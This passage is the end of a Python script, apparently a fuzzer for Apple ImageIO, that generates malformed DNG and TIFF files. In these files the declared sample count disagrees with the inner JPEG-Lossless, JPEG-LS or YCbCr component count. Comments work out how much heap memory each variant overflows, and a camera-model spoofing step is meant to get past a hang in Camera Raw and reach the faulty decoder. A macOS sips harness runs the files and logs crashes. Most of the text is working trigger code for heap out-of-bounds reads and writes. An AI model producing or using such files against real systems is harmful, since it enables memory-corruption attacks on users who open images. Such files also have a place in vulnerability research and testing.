         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('CTRL_tiff_jpegl_1spp_1nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        # --- 8-bit mismatch: Nf < SPP (OOB read direction, SPP controls loop) ---
        ('tiff_jpegl_3spp_1nf_8b',
         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_2nf_8b',
         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=2)),
        ('tiff_jpegl_4spp_1nf_8b',
         build_plain_tiff(64, 64, spp=4, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_1nf_8b_256',
         build_plain_tiff(256, 256, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_3spp_1nf_8b_512',
         build_plain_tiff(512, 512, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        # --- 8-bit mismatch: Nf > SPP (OOB write direction, buffer too small) ---
        # SPP=1 allocates 64*64*1=4096 bytes. Decoder writes 64*64*Nf bytes.
        # Nf=3   → 8192  bytes OOB (doesn't cross page, silent)
        # Nf=4   → 12288 bytes OOB (3 pages OOB, may cross allocation boundary)
        # Nf=16  → 61440 bytes OOB (15 pages, very likely to corrupt heap)
        # Nf=32  → 126976 bytes OOB (31 pages, crosses multiple heap regions)
        # Nf=128 → 524288 bytes OOB (128 pages, guaranteed heap corruption)
        # Nf=255 → 1044480 bytes OOB (255 pages, certain page fault / SIGSEGV)
        ('tiff_jpegl_1spp_3nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_1spp_4nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
        ('tiff_jpegl_1spp_16nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=16)),
        ('tiff_jpegl_1spp_32nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
        ('tiff_jpegl_1spp_128nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=128)),
        ('tiff_jpegl_1spp_255nf_8b',
         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=255)),
        ('tiff_jpegl_1spp_3nf_8b_256',
         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_1spp_32nf_8b_256',
         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=32)),
        # --- 16-bit retained for reference (decode succeeds but PNG export fails) ---
        ('CTRL_tiff_jpegl_3spp_3nf_16b',
         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
        ('tiff_jpegl_3spp_1nf_16b',
         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
        ('tiff_jpegl_1spp_3nf_16b',
         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
    ]
    print('\n[*] Plain TIFF + JPEG-Lossless mismatch targets:')
    for name, data in tiff_jpegl_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- DNG corpus (Camera Raw path) ----
    print(f'\n[*] Generating {len(CORPUS)} DNG test cases (Camera Raw path)...')
    for entry in CORPUS:
        w, h, spp, ic, bits, codec, name, photometric = entry
        fname = os.path.join(outdir, f'{name}.dng')
        try:
            build_dng(w, h, spp=spp, inner_comps=ic, bits=bits,
                      codec=codec, photometric=photometric, outfile=fname)
        except Exception as e:
            print(f'    [!] {name}: {e}')

    # ---- NEW TARGET: TIFF + YCbCr + JPEG-Lossless ----
    # YCbCr photometric routes to multi-component JPEG decoder path.
    # If that decoder iterates over all 3 expected YCbCr components but SOF3 only
    # declares Nf=1, we get an OOB read from the scan data stream.
    ycbcr_jpegl_cases = [
        # CTRL: SPP=3, Nf=3 (matching) — must decode cleanly to confirm YCbCr path is reached
        ('CTRL_ycbcr_jpegl_3spp_3nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=3)),
        # OOB READ: SPP=3 (YCbCr, 3-channel buffer), Nf=1 (stream has 1 component)
        # Decoder loops over 3 channels, reads past end of single-component scan data
        ('ycbcr_jpegl_3spp_1nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=1)),
        ('ycbcr_jpegl_3spp_2nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=3, inner_comps=2)),
        # OOB WRITE: SPP=1 (1-channel buffer), Nf=3 (decoder writes 3 channels)
        ('ycbcr_jpegl_1spp_3nf_8b',
         build_tiff_ycbcr_jpegl(64, 64, spp=1, inner_comps=3)),
        # Large image variants — larger OOB for reliable crash
        ('ycbcr_jpegl_3spp_1nf_8b_256',
         build_tiff_ycbcr_jpegl(256, 256, spp=3, inner_comps=1)),
        ('ycbcr_jpegl_3spp_1nf_8b_512',
         build_tiff_ycbcr_jpegl(512, 512, spp=3, inner_comps=1)),
    ]
    print('\n[*] NEW TARGET: TIFF + YCbCr + JPEG-Lossless (multi-component decoder path):')
    for name, data in ycbcr_jpegl_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- NEW TARGET: Plain TIFF + JPEG-LS ----
    # JPEG-LS (compression=34892) in plain TIFF — distinct from DNG+JPEG-LS (Camera Raw).
    # JPEG-LS supports multi-component; Apple's JPEG-LS decoder may iterate all Nf components.
    tiff_jpegls_cases = [
        # CTRL: SPP=3, Nf=3 — confirm JPEG-LS path is reachable in plain TIFF
        ('CTRL_tiff_jpegls_3spp_3nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=3)),
        ('CTRL_tiff_jpegls_1spp_1nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=1)),
        # OOB READ: SPP=3, Nf=1
        ('tiff_jpegls_3spp_1nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=1)),
        ('tiff_jpegls_3spp_2nf_8b',
         build_tiff_jpegls(64, 64, spp=3, inner_comps=2)),
        # OOB WRITE: SPP=1, Nf=3
        ('tiff_jpegls_1spp_3nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=3)),
        ('tiff_jpegls_1spp_4nf_8b',
         build_tiff_jpegls(64, 64, spp=1, inner_comps=4)),
        # Large variants
        ('tiff_jpegls_3spp_1nf_8b_256',
         build_tiff_jpegls(256, 256, spp=3, inner_comps=1)),
        ('tiff_jpegls_1spp_3nf_8b_256',
         build_tiff_jpegls(256, 256, spp=1, inner_comps=3)),
    ]
    print('\n[*] NEW TARGET: Plain TIFF + JPEG-LS (multi-component capable codec):')
    for name, data in tiff_jpegls_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format) ----
    # Alternative decoder path: SOF3 lives in tag 347, strip has only SOS+scan.
    # Apple's TIFF/JPEGL decoder may accept this format when self-contained strip fails.
    tiff_jpegl_split_cases = [
        ('CTRL_split_jpegl_1spp_1nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=1)),
        ('CTRL_split_jpegl_3spp_3nf_8b',
         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=3)),
        # Mismatch: SPP=1 outer, Nf=3 inner → OOB WRITE
        ('split_jpegl_1spp_3nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=3)),
        ('split_jpegl_1spp_4nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=4)),
        ('split_jpegl_1spp_16nf_8b',
         build_tiff_jpegl_split(64, 64, spp=1, bits=8, inner_comps=16)),
        # Mismatch: SPP=3 outer, Nf=1 inner → OOB READ
        ('split_jpegl_3spp_1nf_8b',
         build_tiff_jpegl_split(64, 64, spp=3, bits=8, inner_comps=1)),
    ]
    print('\n[*] Old-style TIFF/JPEG-Lossless (JPEGTables tag 347 split format):')
    for name, data in tiff_jpegl_split_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    # ---- Real camera model DNG (Camera Raw hang bypass hypothesis) ----
    # Hypothesis: Camera Raw hangs because 'FuzzResearch/ImageIOAudit' is unknown
    # and Camera Raw waits for network/calibration data. Using a real camera model
    # (e.g. Canon EOS R5) allows Camera Raw to use bundled calibration and complete
    # quickly, at which point the JPEGL mismatch can trigger the OOB write/crash.
    print('\n[*] Real camera model DNG (Camera Raw hang bypass):')
    CANON_R5 = ('Canon', 'Canon EOS R5')
    NIKON_Z9  = ('Nikon Corporation', 'NIKON Z 9')
    real_cam_cases = [
        # CTRL (matching): should decode quickly if Camera Raw uses bundled calibration
        ('camraw_canon_cfa_uncomp_ctrl',
         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        ('camraw_nikon_cfa_uncomp_ctrl',
         build_dng(8, 8, spp=1, inner_comps=1, bits=16, codec=COMP_UNCOMPRESSED,
                   photometric=PHOTO_CFA, camera_model=NIKON_Z9)),
        # JPEGL CTRL (Canon): if Camera Raw accepts, decoder should run cleanly
        ('camraw_canon_cfa_jpegl_ctrl',
         build_dng(64, 64, spp=1, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        # JPEGL mismatch (Canon): if CTRL doesn't hang, this might crash (OOB write)
        ('camraw_canon_cfa_jpegl_1spp_3nf',
         build_dng(64, 64, spp=1, inner_comps=3, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        ('camraw_canon_cfa_jpegl_1spp_4nf',
         build_dng(64, 64, spp=1, inner_comps=4, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_CFA, camera_model=CANON_R5)),
        # LinearRaw mismatch (Canon): OOB read direction
        ('camraw_canon_lr_jpegl_3spp_1nf',
         build_dng(64, 64, spp=3, inner_comps=1, bits=16, codec=COMP_JPEG_LOSSLESS,
                   photometric=PHOTO_LINEAR_RAW, camera_model=CANON_R5)),
    ]
    for name, data in real_cam_cases:
        fname = os.path.join(outdir, f'{name}.dng')
        with open(fname, 'wb') as f:
            f.write(data)
        print(f'    {fname}  ({len(data)} bytes)')

    print(f'\n[+] Corpus ready.')


# ========================== macOS tester ==========================

def test_corpus(outdir='corpus'):
    """Run all corpus files through macOS sips (ImageIO). macOS only."""
    if sys.platform != 'darwin':
        print('[!] --test-corpus requires macOS.')
        return

    files = sorted(f for f in os.listdir(outdir) if f.endswith('.dng'))
    print(f'[*] Testing {len(files)} files via sips (forced decode to PNG)...\n')
    crashes, hangs, ok = [], [], []

    for fname in files:
        path = os.path.join(outdir, fname)
        try:
            r = subprocess.run(
                ['sips', '-s', 'format', 'png', path, '--out', '/tmp/sips_out.png'],
                capture_output=True, text=True, timeout=30,
                env={**os.environ,
                     'MallocScribble': '1',
                     'MallocGuardEdges': '1'},
            )
            if r.returncode != 0:
                crashes.append((fname, r.returncode, r.stderr.strip()))
                print(f'  [CRASH rc={r.returncode}] {fname}')
                if r.stderr:
                    print(f'    {r.stderr.strip()[:120]}')
            else:
                ok.append(fname)
                print(f'  [  ok ] {fname}')
        except subprocess.TimeoutExpired:
            hangs.append(fname)
            print(f'  [ HANG] {fname}')

    print(f'\n--- Results: ok={len(ok)}  crash={len(crashes)}  hang={len(hangs)} ---')
    if crashes:
        print('\n[!] Findings (crashes / decode errors):')
        for f, rc, err in crashes:
            print(f'    {f}  rc={rc}  {err[:80]}')
    if hangs:
        print('\n[!] Hangs:')
        for f in hangs:
            print(f'    {f}')


# ========================== Entry point ==========================

def main():
    ap = argparse.ArgumentParser(
        description='DNG+JPEGL/JPEGLS/J2K metadata mismatch fuzzer for Apple ImageIO'
    )
    ap.add_argument('--out',    default='trigger.dng')
    ap.add_argument('--codec',  default='jpegl',
                    choices=['j2k', 'jpegls', 'jpegl', 'uncompressed'])
    ap.add_argument('--photo',  default='cfa',
                    choices=['cfa', 'linear'],
                    help='PhotometricInterpretation: cfa=32803, linear=34892')
    ap.add_argument('--width',  type=int, default=64)
    ap.add_argument('--height', type=int, default=64)
    ap.add_argument('--spp',    type=int, default=1,
                    help='TIFF SamplesPerPixel (outer metadata)')
    ap.add_argument('--inner',  type=int, default=3,
                    help='Inner codec component count (inner metadata, > spp → OOB write)')
    ap.add_argument('--bits',   type=int, default=16)
    ap.add_argument('--corpus', action='store_true',
                    help='Generate full test corpus')
    ap.add_argument('--test-corpus', action='store_true',
                    help='Test corpus via sips (macOS only)')
    args = ap.parse_args()

    codec_map = {
        'j2k': COMP_JPEG2000, 'jpegls': COMP_JPEG_LS,
        'jpegl': COMP_JPEG_LOSSLESS, 'uncompressed': COMP_UNCOMPRESSED,
    }
    photo_map = {'cfa': PHOTO_CFA, 'linear': PHOTO_LINEAR_RAW}

    if args.corpus:
        generate_corpus()
        return
    if args.test_corpus:
        test_corpus()
        return

    build_dng(args.width, args.height,
              spp=args.spp, inner_comps=args.inner,
              bits=args.bits,
              codec=codec_map[args.codec],
              photometric=photo_map[args.photo],
              outfile=args.out)


if __name__ == '__main__':
    main()
